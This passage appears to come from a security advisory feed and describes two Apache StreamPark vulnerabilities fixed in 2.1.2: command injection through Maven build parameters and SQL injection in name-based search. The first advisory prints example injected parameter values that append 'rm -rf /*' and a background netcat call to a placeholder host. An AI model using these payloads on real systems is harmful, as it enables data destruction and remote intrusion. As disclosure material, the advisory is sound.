      <description>In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.

Mitigation:

all usersÂ should upgrade to 2.1.2

Example:

##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &amp;&amp;, compilation failure use "||" or "&amp;&amp;":

/usr/share/java/maven-3/conf/settings.xml || rm -rf /*

/usr/share/java/maven-3/conf/settings.xml &amp;&amp; nohup nc x.x.x.x 8899 &amp;

      <description>In the Streampark platform, when users log in to the system and use certain features, some pages provide a name-based fuzzy search, such as job names, role names, etc. The sql syntax :select * from table where jobName like '%jobName%'. However, the jobName field may receive illegal parameters, leading to SQL injection. This could potentially result in information leakage.

Mitigation:

Users are recommended to upgrade to version 2.1.2, which fixes the issue.
